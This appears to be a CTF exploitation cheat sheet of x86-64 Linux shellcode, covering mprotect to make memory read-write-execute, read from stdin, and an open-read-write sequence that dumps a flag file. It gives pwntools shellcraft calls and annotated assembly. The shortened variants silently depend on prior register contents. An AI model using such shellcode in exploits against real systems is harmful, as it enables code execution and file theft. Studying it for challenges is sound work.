[toc]



## mprotect

Function:

```c
int mprotect(void *addr, size_t len, int prot);
```

Pwntools:

```py
shellcraft.amd64.mprotect(0xdeadbeef, 0x1000, 7)
```

Assembly:

```
/* mprotect(addr=0xdeadbeef, length=0x1000, prot=7) */
mov edi, 0xdeadbeef
push 7
pop rdx
mov esi, 0x1010101 /* 4096 == 0x1000 */
xor esi, 0x1011101
/* call mprotect() */
push 9 /* mov eax, '\n' */
pop rax
inc eax
syscall
```

Shortened Assembly:

```
shl edi, 0xc
mov ax, 0xa
mov dx, 0x7
syscall
```

- `0xa` represents the syscall number for `mprotect`

- `0x7` is a common protection flag value, combining `PROT_READ (0x1)`, `PROT_WRITE (0x2)`, and `PROT_EXEC (0x4)`. 

Arguments:

- **Syscall number (rax)**: `0xa` (10 in decimal), which corresponds to `mprotect`.
- **First argument (rdi)**: Since `edi` was shifted 12 bits (0xc), this would be a modified, page-aligned memory address for `mprotect`.
- **Second argument (rsi)**: The shellcode doesn't modify `rsi`, so it holds a specific size or default value.
- **Third argument (rdx)**: `0x7`, setting the protection to read, write, and execute.



## Read

Function:

```c
ssize_t read(int fd, void *buf, size_t count);
```

Pwntools:

```py
shellcraft.amd64.read(0, 0xdeadbeef, 100)
```

Assembly:

```
/* call read(0, 0xdeadbeef, 0x64) */
xor eax, eax /* SYS_read */
xor edi, edi /* 0 */
push 0x64
pop rdx
mov esi, 0xdeadbeef
syscall
```

Shortened Assembly:

```
xchg eax, edx
xor eax, eax
mov edi, eax
mov esi, ecx
syscall
```

Arguments:

- **Syscall Number (eax)**: `xor eax, eax` sets `eax` to `0`, which is the syscall number for `read`.
- **File Descriptor (edi)**: By moving `eax` (which is `0`) into `edi`, the file descriptor is set to `0` (stdin).
- **Buffer Address (esi)**: `mov esi, ecx` likely sets up `esi` as a buffer address, which means `ecx` should contain the address where data should be read.



## ORW

Shortened Assembly:

```
/*   *(0xdeadbeef)=b'flag\x00'	 */
mov rax, 2
mov rdi, 0xdeadbeef
xor rsi, rsi
syscall
mov rdi, rax
mov rax, 0		; can be removed if returned fd=0
mov rsi, 0xdeadbabe
mov rdx, 100
syscall
mov rax, 1
mov rdi, 1
syscall
```

